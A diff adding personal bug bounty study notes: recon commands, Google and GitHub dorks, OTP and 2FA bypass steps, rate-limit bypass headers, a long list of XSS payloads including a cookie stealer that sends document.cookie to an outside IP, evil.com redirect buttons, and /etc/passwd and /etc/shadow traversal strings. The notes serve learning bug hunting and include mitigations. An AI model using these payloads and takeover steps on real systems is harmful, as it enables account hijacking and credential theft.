@@ -1,0 +1,807 @@
+Top 10 rules:
+
+* Choose the right bug bounty program.
+* Recon, Donont DDOS with active scans and automated scanners
+* Do not expect rewards.
+* Develop your flow of approach and methodology.
+* Surround yourself with the Bug Bounty Community to keep yourself updated.
+* Automatic Everything
+* Make your own checklist.
+* When you find a bug chain,
+* Increase the severity; impact matters.
+* Mental health is important. Take a break and do something leisurely.
+
+What is Web:
+
+Websites: Collections of web pages are called websites. Websites are built with lots of web pages, and the main web page of the website is called the home page.
+Web browser: It is software programs that allow a user to locate, access, and display web pages of websites.
+
+Shodan:
+For Linux : pip install shodan 
+Online : https://www.shodan.io/
+alternative : https://hunter.io/
+
+for setting api : shodan init <key>
+
+shodan info
+shodan version
+shodan count openssh
+shodan count bigip
+shodan download bigipfile bigip
+shodan host <ip>
+shodan myip
+shodan parse -h
+shodan search -h
+shodan search ssh
+shodan scan -h
+shodan scan submit <ip>
+shodan scan submit <ip range> [go to https://bgp.he.net/ search by company name and find their ip range] 
+shodan stats ftp
+ 
+Shodan Live Hunting:
+Directory Listing, Username and passwords, Internal ENdpoints, Private Ips, Source Code Disclose, API keys
+
+For Linux : https://github.com/TryGhost/Ghost
+https://github.com/EntySec/Ghost
+
+
+git clone https://github.com/EntySec/Ghost.git
+ls && cd Ghost && chmod +x setup.py
+./setup.py install 
+sudo ghost
+
+
+ffuf -w wordlist -u http://www.abc.xyz/FUZZ -e .aspx,.html,.php,.txt,.conf,.bak
+ffuf -request req.txt -request-proto https -mode clusterbomb -w users.txt:HFUZZ -w users.txt:WFUZZ -c -mc all -fl 7 [username-HFUZZ&password=WFUZZ&submit=Submit]
+ffuf -request request.txt -request-proto http -w /path/to/users/file.txt:FUZZ -mc 200
+
+https://www.phrack.me/tools/2022/07/06/Ffuf-cheatsheet.html
+
+Content Discovery: 
+dirsearch -u example.com
+dirsearch -e php,html,js -u example.com
+dirsearch -e php,html,js -u example.com common.txt
+dirsearch -e php,html,js -u example.com -r
+dirsearch -e php,html,js -u example.com -r -R 3
+dirsearch -e php,html,js -u example.com -t 30
+dirsearch -e php,html,js -u example.com -i 200l204,400,403 -x 500,501,429
+dirsearch -e php,html,js -u example.com -proxy 127.0.0.1:8080
+dirsearch -e php,html,js -u example.com -o x.txt
+
+php,zip,aspx,env,xml,bak,conf
+
+Visual Recon:
+Go-Stare : https://github.com/dwisiswant0/go-stare
+cat urls.txt | go-stare -o ./out -q 90
+
+Github Recon:
+Dorks : https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
+Manual Way: https://www.hackerone.com/ethical-hacker/how-recon-and-content-discovery
+Automation: git clone https://github.com/techgaun/github-dorks && pip install -r requirements.txt && python3 github-dork.py -u <username>
+
+Others Link :
+https://github.com/anshumanbh/git-all-secrets
+https://github.com/trufflesecurity/trufflehog
+https://chromewebstore.google.com/detail/trufflehog/bafhdnhjnlcdbjcdcnafhdcphhnfnhjc
+https://github.com/michenriksen/gitrob
+https://github.com/tillson/git-hound
+
+Dorks:
+“Hackme.tld” API_key
+“Hackme.tld” secret_key
+“Hackme.tld” aws_key
+“Hackme.tld” Password 
+“Hackme.tld” FTP
+“Hackme.tld” login 
+“Hackme.tld” github_token 
+
+Waf-Detection:
+nmap <ip> --script=http-waf-detect -p80,443 -v
+nmap <ip> --script=http-waf-fingerprint -p80,443 -v
+wafw00f <link>
+
+Github Dorks:
+site:
+inurl:
+intext:
+filetype:
+intitle:
+
+intitle:"index of" inurl:ftp after:2018
+intitle:"index of" inurl:http after:2018
+intitle:"forum" inurl:ftp after:2018
+
+*/google.com/*
+*.google.com
+google.com*
+
+site:*.com filetype:ppt networking
+allintext:password filetype:log after:2018
+filetype:env "DB_PASSWORD" after:2018
+fileyype:xls inurl:"emails.xls"
+
+MindMap:
+What is Mindmap:
+* Visual Representation of your approach towards a target
+* Structured block diagram of the flow for pentest
+* It is step by step approach
+* Pictorial and visual representation is easy to remember
+
+Why is so Important:
+
+* Mindmaps are execellent to plan your workflow
+* Mindmaps helps you to build your own methadology
+* Mindmaps helps in a structed representation of your process
+* You know the next steps and be clear with goals
+* Easy for you as well for others to understand the approach
+
+
+Target > Amass + Subfinder + Sublist3r + Findomain + Online > Combine subdomains + Final subdomains > [subjack + final takeover] + [CORSScanner + Final cors] + [massdns + combined ips + final ips + nmap port and scripts] + [aquatone + urls + dirsearch] 
+
+* Subdomain enum using Amass/subfinder
+* Combined and saved ips
+* subjack for stko
+* CorsScanner for CORS
+* Massdns to resolve subs > massscan all ports
+* Nmap to banner grab all services/software save in nmap,html
+* Aquatone to take Screenshots,save in ss.html
+* Aquatone urls, save it to aquatone.txt
+* Dirsearch to fuzz and save it to txt
+
+ASNS/reverse whois/aquatones > amass/subfinder > massDNS/Manual > massScan > Eyewithness > Builtwith/Wappalyzer > wordlist/Fuzzing/Burp > parameter target
+
+
+Owasp: It is an open web application security project.
+
+* Top 10 sections of vulnerabilities
+* Bible for Security Professionals
+* Categorization of vulnerabilities for each type
+* Vulnerabilities in Web Applications for All CMS
+
+
+Owasp 2013 : Injection > Basm > XSS > IDOR > Security Misconfig > SDE > MFLAC > CSRF > Using Components with known vulns > Unvalidated Redirect and forwards
+
+Owasp 2017 : Injection > Broken Auth > Sensitive data Exposure > XXE > BAC > Security Misconfiguratuin > XSS > Insecure Deserialization > Using Components with known vulns > Insuffieient loggin and monitoring
+
+Injection:
+* Inection means to inject
+* An attacker send a query(basically injected) into any server. If the server interprets it, BHOOM
+* Any interpreter which combines data into command is vulneranle to injection attacks.
+* Types : SQLI, LADPI, OSI, Command Execution ,RubyI, Shell shock etc
+
+Why Injection Happens:
+* Untrusted data directory Interpreted
+* Where can you send untrusted data: Http request, in the form of URL parameters, form fields, headers or cookies 
+* everywhere
+
+What can be achieved by Injection:
+* If the attacker is able to inject his query or command he can perform desirable actions into the server.
+* SQLI , LFI etc
+
+Broken Authentication:
+
+* When Any application functionality is broken/weak and attacker is able to bypass the authentication using session token flaws, brute force, No rate-limiting, Password compromise using response manipulation or any other flaws which can give attacker temporary or permanent access to the user identity.
+* OTP Bypass
+* Captcha Bypass
+* Common Password BruteForce
+* 2FA bypass
+
+Why  BA Happens:
+* Manipulated Response in interpreted by the application
+* No Rate Limit
+* Lack of session Management
+
+What can be achieved by BA:
+* Temporary access to users account(TATO)
+* Permanent access to users account(PATO)
+* Attacker can modify and alter the user details
+* Accounts can be used for malicious purposes to conduct attacks
+
+How do we fix BA issue:
+* Uses of strong(JWT,SAML,OAuth) - Input validation
+* Donot allow defalut creds
+* Rate Limit
+* Uses of Server side secure session management that genarates high entropy secure sessions
+
+Authentication Bypass - OTP Bypass
+
+* Checking whether the OTP's are right or wrong improperly leads to bypass
+* Verifying at the client side only and taking decisions in dangerous
+* Only, allowing loging into based on true or false condiitions are dangerous.
+
+
+Method 01 : First of all, create an account, forget your password, intercept the request, and analyze whether you should find True/False/1/0 in plain text or decoded text. then again go to Create Another Account/Reset Password. Enter the random OTP after using Burp, and then when you find the OTP, forward this and do an intercept on the response. After that, manipulate this from 404 to 200, incorrect to correct, 0 to 1, error to success, or false to true.
+
+Method 02 : 1st create a account in a site and when login the account intercept not only request but also response. then analyze that you should find True/False/1/0 in a plain text or decoding text. when you find the things copy that when correct login. After successful login again login 2nd account and give the wrong password. and intercept not only request but also response and analyze it and paste the plain/decoding text. if you login successfully that means here is Account TakeOver by Response Manipulation
+
+Method 03 : Go to Forget Pass and put the right OTP and intercept request and response also. and focus on 200/1/success/true, etc. Now go to forget pass and put the wrong OTP and intercept request and response also. and change 404 to 200 or incorrect to correct or 0 to 1 or error to success or false to true, etc. If we bypass it, that means there is a bug. Youcan change your Gmail or phone number and maybe login to their account
+
+Method 04 : First Create an account, then go to Forget Pass and intercept response with Burp Suite and try to find a token. If you find a token, that's great, and then go to the mail, and from the mail you also find the token. If the tokens match, that means there is an account takeover. You can change the victim email address as well.
+
+Method 05 : Start your Burp then do intercept to response and then change to id/userid/uid [Give the right OTP
+
+Method 06 : first go to forget password and enter your mail and intercept it before sending the request, and you can see your mail in JSON format. You are adding another email like this. If you receive both OTPs, that means there is an Account TakeOver Bug.
+
+{
+	"email" :[
+	"target@gmail.com","attacker@gmail.com"	]
+}
+
+Method 07 : Start your Burp then do an intercept to response, then if you find the OTP that means you can easily login
+
+Method 08 : Start your Burp then do intercept and go to repeater then find mfa then change to 0 [1 means on and 0 means off][mfa means multifactor login]
+
+Authentication Bypass - Captcha Bypass
+
+* Using response manipulation
+* Verifying at the client side only and taking decisions in dangerous
+
+Method 01:
+when you are finding a captcha in a login form or registration form. FIllup the form and solve the captcha after solving intercept with burp
+
+---> 1st you delete the captcha request and go forward if registration or login done that means this is bug
+
+https://www.youtube.com/watch?v=AGKbBf0MYiA
+https://www.youtube.com/watch?v=wC_ULxXNpfE
+
+Account Takeover:
+
+* Mapping users as per uid, gid, and other parameters like user_id, user=, etc. is good.
+* until proper checks and access control are in place.
+* Log in to other users accounts by just using their userids.
+
+For bug hunting First, analyze the whole website, mainly how the login function works and how OTP works. Check the request and response and copy the response to the notepad.
+
+Method 01: First Create an account on a site, intercept it with burp, and analyze it. then go to forget pass and request an OTP. You can try Authentication Bypass by giving the wrong OTP and seeing the false request, then editing those requests, and if you login to the account, that means this is Authentication Bypass. then now moving to account takeover If you are finding any typer uid or id in your response, try changing those ids and forwarding them. If you see that you are logging in to another account, that means it is an account takeover.
+
+
+Interesting account takeover due to OTP exposure:
+
+* Some web applications reveal their right OTP or verification code in the response themselves.
+* Many websites are vulnerable to this attack because the website reveals a verification code to the attacker, which is going to be sent to the victim's device.
+
+First of all, create an account, and when sending OTPS, intercept it and see the response very carefully. If you find any OTP and match the OTP on your mobile, the owner is sent. If both match, that means there is a bug.
+
+interesting Account takeover due to 2FA logic Flaw:
+
+* Doing an email account takeover of anyone, ue to a logic flaw on the website
+
+Method 01 : Start your Burp then do intercept and go to repeater then find mfa then change to 0 [1 means on and 0 means off][mfa means multifactor login]
+
+Interesting Account takeover of support and CEO email due to logic Flaw:
+
+* Doing an email account takeover of anyone, due to a logiv flaw on the website.
+
+Method 01 : First, create an account with the email and verify it with the email, then, after some time, add another mail and try to verify the previous activation link from the first mail. If it is done, that means there is a bug.
+
+
+Authentication Bypass - Mitigations:
+
+* Donot rely only on client side, Checks at server side and are important
+* Verifying at the client side only and taking  decisions is dangerous
+* Use Authentication based on strong TOken JWT mechanism
+* Use authentication based on encrypted data which can be AES for example
+
+No Rate limit to Account Takeover :
+
+* We will send x number of simultaneous requests to the server and server will act on each request
+* Thus making x number of email accounts on the website
+* No validation or limiting the requests and taking deisions in dangerous
+
+First of all, go to the signup page, fill out that, and then intercept with burp, check, and find the interesting things. Must be sent to the repeater and intruder also. then in the intruder tab, target the mail and set some email as a wordlist like 10/15 emails, and then start the attack. If the response is 200, that means this is a bug and then test it as a try to login those mail and password
+
+No Rate limit leads to Account Takeover :
+
+* We will send X number of simultaneous requests to the server and server will act on each request
+* Thus by sending x number of right otp token,Password we can successfully crack the code
+* No validation or limiting the requests and taking decisions is dangerous
+
+First of all go to signup page then enter your phone number and then give to wrong otp then interept with burp and send to repetear and intruder . go to intruder tab target to otp and attack before the attack change to some settings.
+Options > Request Engine > Fixed > 3000 [3000ms = 3s]
+If the website has no rate limmit you can find your right OTP. then copy the right response of OTP and paste to repeater. then if your otp is logi that means here is a bug
+
+Finding The No Rate Limit:
+First of all, go to the signup page, then create a new account, then go to forgetpass, then give the email or phone number, then intercept it. analyze it and find the email, then go to intruder and set the null payload 100 times and hit attack.
+
+No Rate Limit on OTP vesity leads to ATO
+
+* We will send x number of simulataneous requests to the server and server will act on each requests.
+* Thus by sending x number of right otp token, password we can successfully crack the code
+* No validation or limiting the request and taking decisions is dangerous.
+
+Best method for finding no rate limit: 
+
+Race Hazard : Options > Request Engine > Fixed > 3000 [3000ms = 3s]
+IP rotation : like changing ips after a time
+
+Source : https://thezerohack.com/hack-any-instagram
+
+No Rate Limit Protection - Bypass 1
+
+* We will send x number of simultaneous requests to the server and server will act on each request
+* We will do bypass for no-rate limit using nullbyte %00
+
+&user%5Bemail%5D=email@here.com%00 - and keep adding %00 everytime you are rate limit. adter a while you can go back to just %00 as it resets after so long.
+Can confirm using %00 over and over id fixed but we can nowuse %0d%0a and aschieve same results by increasing %0d%0a when we hit "Too many requests"
+So I retested and it seems we can still use %09 over and over again to bypassthe rate limit. so nope not fixed yet
+
+Report: https://hackerone.com/reports/170310
+
+we can use those as a wordlist in a attack time.
+abc@gmail.com%00
+abc@gmail.com%0d%0a
+abc@gmail.com%09
+abc@gmail.com%09%09
+
+No Rate Limit Protection - Bypass 2:
+
+* We will send x number of simultancous requests to the server and server will act on each requests
+* We will do bypass for no rate limit X-Forwarded-For
+* Thus by sending x number of right otp token, Password we can successfully crack the case
+* No validation or limiting the requests and taking decision is dangerous
+
+add header with request:
+X-Originating-IP: IP
+X-Forwarded-For: IP
+X-Remote-IP: IP
+X-Remote_Addr: IP
+X-Client-IP : IP
+X-Host: IP
+X-Forward-Host: IP
+
+No Rate limit to Tool Fake IP:
+Install Jython : https://www.jython.org/download.html [burp > Extender > Option > Python > Select Psth]
+BurpFakeIP : https://github.com/AeolusTF/BurpFakeIP
+
+
+No Rate-Limit-Mitigation
+
+* Always limit the requests by an user
+* Verifing at the client side and only taking decisions is dangerous
+* Rate-Limit uses based on IP
+* No of attempts for an account at server side
+
+XSS: Cross-site scripting is a type of security vulnerability that can be found in some web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
+
+Types of XSS:
+Reflected XSS : Input get reflected
+Stored XSS : Input gets stored in the server
+DOM XSS : Input is stored in DOM
+
+Reflected XSS :
+* Checking for if input gets relfected in the page source, Body,URL
+* If Input gets reflected, we can hunt for RXSS
+* Sending a simple JS to exexute and prove XSS
+* No Input validation or sanitization is dangerous
+
+Common Payloads:
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+<script>alert(2</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+"><img src=x onerror=alert(document.domain)>.jpeg
+"><img src=x onerror=alert(document.domain)>.gif
+"><img src=x onerror=alert(document.domain)>.png
+"><img src=x onerror=alert(document.domain)>.mp4
+
+hacker' -confirm(1337)-'
+
+<script>confirm('XSS')</script>
+<img src=x onerror=confirm('XSS');>
+
+<img/src=x onError="${x};alert(Hello);">
+<iframe srcdoc="<img src=x onerror=alert(document.cookie)>"></iframe>
+
+XSS in Request Headers:
+
+* We can do xss by giving the arbitary js payload in to the request headera
+* If the application interpreted and executes it, then BOOM
+* You can choose any request Header eg- Referer
+* No sanitization and taking decisions in dangerous
+
+Method 01:
+--> Intercept with burp and check the responses and set to repeater. You can change GET to POST and POST to GET
+--> If Changes in the header section use Referer: http://google.com/?q=hackers"><script>alert(1)</script>
+--> if execute that means this is XSS
+Payload:
+Referer: http://google.com/?q=hackers"><script>alert(1)</script>
+Referer: http://google.com/?q=hackers"><img src=x onerror=alert('XSS');>
+
+XSS in User Agent and Caching Server attacking many :
+
+* We attack the website using XSS in User agent in the web Application
+* We will also save our payload into the Caching server(MISS-HIT)
+* Whenever anyone visits the url which is cached by the server will lead to XSS
+* XSS will remain untill cached in flusged
+
+--> curl "http://example.com/header.php?rohit"
+--> curl "http://example.com/header.php?rohit" -I
+curl "http://example.com/header.php?rohit" -I -H "xss:<svg onload=alert(0)>"
+
+
+XSS in EMail Login Field:
+
+* We attack the website using XSS in email field in the web application
+* According to RFC822 email addreess validator we will make our payload
+* XSS win, win!!
+
+payloads:
+--> "><svg/onload=confirm(1)>"@gmail.com
+--> "<script>alert(1)</script>"@example.com
+--> "><img src=x onerror=alert(document.cookie);>
+--> "><svg/onload=alert(document.cookie)>"@x.y
+--> use iframe tag and inject any html page it may also deface page, hosted by other domain or thing. Genarate Iframe from here : https://www.iframe-generator.com/
+--> If you find in parameter in login link try to use Xss and use also url encoding and double url encoding
+
+example : %22%3E%3C
+
+Plain Text:
+http://abc.com/login?domain=<img src=x onerror=alert('XSS');>
+http://abc.com/login?domain=<script>alert('XSS')</script>
+http://abc.com/login?domain="><script>alert('XSS')</script>
+http://abc.com/login?domain="><img src=x onerror=alert('XSS');>
+
+<img src=x onerror=alert('XSS');>
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS');>
+
+
+Xss Protection - Bypass Base64 Encoding:
+
+* We will bypass and Xss where there is improper input sanitizaition or HTML Encoding
+* The application has proper checks for other xss payload and block it
+* No proper encoding and taking decisions is dangerous
+
+--> In the Link use base 64 for bypassing WAF or protection
+
+hacker' -confirm(1337)-'
+
+
+Xss by using spider:
+
+* If we do not get a parameter directly from the application
+* We will find a injection point burpsuite spider feature
+Inject the xss payload in the param:
+
+--> Intercept with burp and send to spider
+--> go to target > sitemap add to scope
+--> FIlter > show only in scope items
+
+www.abc.xyz/?q=
+
+XSS protection Bypass - Poorly validated website:
+
+* We will bypass and xss where there is improper input sanitization or html encoding and the developer has made right click off
+* No proper encoding or escaping and taking decisions is dangersous
+* Never underestimate the power of view:source or Burp
+
+--> SOme time in the url reflected some word after parameter . target those words and try to XSS
+
+example :
+www.abc.xyz/hacking.php?activity=hackers [if hackers keyword reflacted in the webpage try to XSS]
+
+Blind XSS Explotation:
+
+* We will submit a feedback from or a chatbot request
+* but we will not know,If there exits a vulnerability of XSS, So we are going
+* to give a payload which will make a request to server when the payload is executed
+* XSS hunter
+
+--> You can use xsshunter and burp collaborator for this.
+
+Stored XSS:
+
+* If any application stores you input but in an unsafe manner
+* Always try where you can save the input xss payload where the server saves the payload
+* Example : edit profile, Support chat bots, anywhere which is stored comment section etc
+
+--> First Create an account in a website and go to edit profile page and try to input <>. and see the response
+--> If You see that no error thats good and if you found any type of error try to capture by burpsuite and manipulate the request and see the result
+--> Try to Balancing and you may find the bug
+
+DOM XSS:
+* This arises when the DOM is used to genarate dynamic content containing user input that can be processed without checking
+* Client side attack, input comes into the DOM is source. It gets executed though in the DOM is sink
+
+Source List:
+
+document.URL
+document.referrer
+location
+location.href
+location.search
+location.hash
+location.pathname
+
+Sink List:
+
+eval
+setTimeout
+setInterval
+document.write
+element.innerHTML
+
+--> First see the source Code and find the sink
+
+In the Source code here sink is name so use the name parameter https://brutelogic.com.br/tests/sinks.html?name=Zaber<img src=x onerror=alert(1)>
+In the Source code here sink is redir so use the redir parameter https://brutelogic.com.br/tests/sinks.html?redir=http://google.com
+https://brutelogic.com.br/tests/sinks.html?redir=javascript:alert(1)
+
+Automation:
+Findom-Xss : https://github.com/dwisiswant0/findom-xss
+LinkFinder : https://github.com/GerbenJavado/LinkFinder
+
+git clone https://github.com/GerbenJavado/LinkFinder.git && cd LinkFinder && pip3 install -r requirements.txt && python3 setup.py install
+
+./findom-xss.sh https://domain.tld/about-us.html
+cat urls.txt | ./findom-xss.sh
+./findom-xss.sh https://domain.tld/about-us.html /path/to/output.txt
+
+Xss om Adding Parameter:
+
+--> first intercept with burp and target > site Map and seeing the parameter.
+--> finding the parameter in the header /utm_campain=hacktify suppose it is your parameter
+--> then try to adding new parameter /utm_campain=hacktify?q=<script>alert(1)</script>
+
+Xss Mouse :
+
+* Keyboard input is blocked you can perform mouce
+* Mouse payloads: onmouseover, onmousemove, onmouseup, onmouseenter, onmouseleave, onmousewheel,onmouseout
+* Effecting in bypassign many KEYBOARD input checks and win
+--> <a href="javascript:alert(1)" onmouseover=alert(1)>Hover
+mePlz</a>
+
+XSS polyglots:
+
+* multilingual or person who knows many languages
+* Combining XSS paylaods leads to polyglots
+* Effective in bypassing many input check and win
+
+--> capture the request and send to spider
+--> Go to target and filter show only in scope
+--> go to search and searing common parameters
+--> target the parameter and send to intruder
+--> set wordlist XSS polyglots and hit Attack
+
+<script type="text/javascript">window.location = "link";</script>
+
+XSS Exploitation- URL Redirection:
+
+* We are going to make the victim redirect to evil website
+* We will find a injection point using burp spider feature
+* Injective the XSS payload in the param
+
+<script>document.location.href="http://hacktify.in"</script>
+<script>document.location="http://hacktify.in"</script>
+<img src=1 onerror=prompt(1)>
+
+Xss Exploitation - Phishing:
+
+* We are going to make the victim login to the phishing
+* We will find a injection point using burpsuite spider feature or manually
+* inject the xss payload in the param and BOOM
+* Iframes are love 
+
+<iframe src="https://hacktify.in" height="100%" width="100%"></iframe>
+example : https://abc.xyz/catalog?keyword=<img src=link>
+
+
+XSS Exploitation Cookie Strealer:
+
+<script>alert(document.cookie)</script>
+<script>document.location.href="http://192.168.2.7:1234/cookie="+document.cookie</script>
+<img src=x onerror=this.src='sburpcollaborator?c='+document.cookie>
+<img src=x >
+
+Exploitation :
+--> First login any account and after login account use collaborator for grabbing the cookies
+--> Then go to login form and Give 2nd email and wrong pass and intercept with burp
+--> After intercepting burp replace first id cookie and see the result
+--> if you see that you are accessing another account That means this is bug
+
+XSS Exploitation File Upload Type:
+
+* We are going to upload a file and abuse the file upload functionality to achieve XSS
+* We will find a injection point using burpsuite spider feature
+* Injection the XSS payload in the upload feature
+
+<script>alert(1)</script> >>> uploadme.html
+<svg xmlns="svg file directory" onload="alert(document.domain)"/> 
+
+Exploit 01 :
+--> create a html file and save the payload
+--> in the website find the uploader option and try to upload html file
+--> then intercept with burp and then analyze the request
+--> if upload done thats great then call the file 
+--> If the file is not upload try to bypass it .
+
+Way to bypass:
+--> Target your Target and find the uploading option if you find thats great
+--> Then try to upload image file and intercept it with burp and save request as a txt file  filename="abc.FUZZ" Content-Type: image/jpeg
+--> ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt
+--> ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt ms <size>
+
+Exploit 02:
+--> go to https://github.com/ianare/exif-samples and download any image
+--> see the exiftool and image information
+--> exiftool -Artist='"><img src=x orerror=alert(document.domain)>' name.jpg
+
+XSS: Mitigation:
+
+* Input sanitization
+* Escaping: encoding all the input that the user ends
+* Strong input validation for limited input with sanitization
+* WAF
+* Filter input on arrival: At the point where the user is received, filter as strongly as possible based on what is expected or voiced input.
+* Encode data on output : At the point where user-controllable data is output in http responses,encode the oytput to prevent it rom being interpreted as active content,Depending on the output context, this might require applying combinations of HTML, URL, JS, and CSS encoding
+* Use appropritte response headers - To prevent XSS in HTTP response that arenot intended in contain any html or JS, you can use the Content-Type and X-content-Type-Options headers to ensure that browsers interpret the responses in the way you intend
+* Content Security Policy - As a last line of defense,you can use Content Security Policy(CSP) to reduce the severity of any XSS vulnerabilities that still occur
+
+Bonus :
+
+Paramspider : https://github.com/devanshbatham/ParamSpider
+
+git clone https://github.com/devanshbatham/paramspider && cd paramspider && pip install -r requirments.txt &&  pip install .
+
+paramspider.py --domain <link> --exclude php,jpg,svg --level high
+
+paramspider -d example.com
+paramspider -l domains.txt
+paramspider -d example.com -s
+paramspider -d example.com --proxy '127.0.0.1:7890'
+paramspider -d example.com -p '"><h1>reflection</h1>'
+
+Example : https://www.pethuraj.com/blog/bbc-bug-bounty-write-up-xss-vulnerability/
+https://www.pethuraj.com/blog/google-bug-bounty-writeup/
+
+HackerOne method :
+
+Method 01: 
+--> Go to https://app.mopub.com/reports/custom/
+--> Click New network report.
+--> On the name, enter payload: "><img src=x onerror=alert(document.domain)>
+--> Click Run and save then XSS will trigger.
+
+Method 02:
+--> Create store
+--> Add a member in a store
+--> Member can choose any name
+--> So change the any member name with hunter"><svg/onload=alert(2)>
+--> Now on admain account make changes
+--> That will create activity with attacker malicious payload
+
+Method 03:
+--> Add a asset like "><img src=x onerror=prompt> {     i) Go to program --> scope --> Add asset --> select 'Others' and give "><img src=x onerror=prompt>
+--> Check your console now.
+}
+--> Then, Go to the created program. (You can check with this https://hackerone.com/script_src_x_img_src_x_onerror)
+--> Click the created asset. [xss will be fired now(1)]
+--> Then submit a report.
+--> Whenever the asset is rendering, xss is firing actually(2).
+--> Then, open the submitted report. (xss will be firing here too[3])
+--> Then click 'edit' in assets, (xss will be firing here too(4))
+
+Method 04:
+--> Go to https://core.trac.wordpress.org/ and login. (open new private window and login with another account)
+--> Go to https://core.trac.wordpress.org/newticket and set a summary and description.
+--> Select a Workflow Keyword and click manual. Paste the payload: "><svg/onload=alert(document.domain)>
+--> Click enter button and click Create Ticket button. Now, you will see xss alert. Copy the url and go to private window. Go to url and you will see xss alert.
+
+Method 05:
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/> remove the underscores.
+
+Method 06:
+
+--> go to https://shop.aaf.com and click on any products , tshirt
+--> add that in cart and click on proceed
+--> enter xss payload (a"><svg/onload=prompt(1)> ) in every address field and click on OK proceed
+--> xss will popup
+
+Method 07:
+--> Go to (https://theacademy.upserve.com/playlists/all-videos/).
+--> Click on any video to watch from the playlist and capture the request in burp.
+--> you have to capture the request to (https://theacademy.upserve.com/wp-admin/admin-ajax.php?action=load_player&video_id=5742677405001&player_id=B14h0D4OM&type=pc&post_id=2712)
+--> then replace the video_id with this payload = r"><BODY%20ONLOAD=alert(1)>.
+--> Then see the response in browser and the popup will appear.
+
+Method 08:
+"><script>alert(document.cookie)</script>
+"><script>alert(1)<%2fscript>
+https://www.google.com/"onmouseover="javascript:prompt()"
+onmousemove=alert("XSS_BY_JASHWANTH")
+
+Report Links:
+https://hackerone.com/reports/485748
+https://hackerone.com/reports/391390
+https://hackerone.com/reports/449351
+https://hackerone.com/reports/643908
+https://hackerone.com/reports/484434
+https://hackerone.com/reports/438240
+https://hackerone.com/reports/411690
+https://hackerone.com/reports/415139
+https://hackerone.com/reports/384112
+https://hackerone.com/reports/639796
+https://hackerone.com/reports/339237
+https://hackerone.com/reports/150568
+
+Html Injection:
+
+Html stands for Hypertext Markup Language. HTML is the standard markup language for web pages. The collection of such web pages makes a website. HTML elements are the building blocks of HTML pages. HTML elements are represented by <> tags. Each tag has a different working.
+
+Attack :
+
+Html Injection is a vulnerability that occurs in web applications that allows users to insert an HTML vode via a specific parameter, for example, an entry point.
+
+Exploited with: Social engineering in order to trick valid users into the application, open websites, or insert their credentials in a fake login. From there, it will redirect the users to a page that captures cookies and credentials.
+
+payload:
+
+<h1>Haacked</hacked>
+<img src="www.abc.xyz/uploads/abc.png">
+<input type="button" onclick="location.href='https://evil.com';" value="login to new Website">
+<input type="button" style="height:100px;width:200px;color:green" onclick="location.href='https://evil.com';" value="Login to New Website">
+
+Click Jacking:
+
+https://securityheaders.com/
+https://samy.pl/quickjack/quickjack.html
+https://clickjacker.io/
+https://github.com/shifa123/clickjackingpoc
+https://github.com/shifa123/clickjack
+
+LFI :
+
+The vulnerability exists when a web application includes a file without correctly sanitizing the input, allowing attackers to manipulate the input and inject path traversal characters, and includes other files from the web server.
+
+Path Traversal:
+/etc/passwd
+/etc/shadow
+/var/logs/
+C:\boot.ini
+
+File Inclusion = Path Traversal + execute Files
+
+Payload:
+
+/etc/passwd
+../etc/passwd
+/../etc/passwd
+//etc/passwd
+....//etc/passwd
+//....//etc/passwd
+
+Broken Link HIjacking :
+
+The vulnerability exists when a web applicaation include files, resources, scripts from other web server and the links are not active anymore and available to claim
+
+Broken Link Checker : https://chromewebstore.google.com/detail/broken-link-checker/bjcoimpfplliplknnmgbffboiihamekf
+Broken Link Checker : https://github.com/stevenvachon/broken-link-checker?tab=readme-ov-file
+Broken Link Checker : https://www.deadlinkchecker.com/website-dead-link-checker.asp
+Broken Link Checker : https://error404.atomseo.com/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
